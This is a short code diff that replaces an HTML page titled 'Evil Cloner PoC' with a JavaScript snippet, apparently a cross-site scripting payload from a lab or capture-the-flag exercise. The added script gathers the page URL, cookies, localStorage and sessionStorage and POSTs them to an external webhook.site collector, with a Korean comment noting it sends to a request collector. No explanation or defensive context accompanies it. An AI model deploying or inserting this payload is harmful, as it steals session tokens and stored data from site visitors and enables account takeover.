@@ -1,12 +1,15 @@
-<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Evil Cloner PoC</title>
-</head>
-<body>
-  <h1>Evil Cloner PoC</h1>
+(async () => {
+  const payload = {
+    url: location.href,
+    cookie: document.cookie,
+    localStorage: { ...localStorage },
+    sessionStorage: { ...sessionStorage },
+  };
 
-  <img src="/usr/app/views/layout.ejs">
-</body>
-</html>
+  // 웹훅(요청 수집기)로 전송
+  await fetch("https://webhook.site/a224cd5d-4479-4063-9d74-f207c17f7bd8", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify(payload),
+  });
+})();
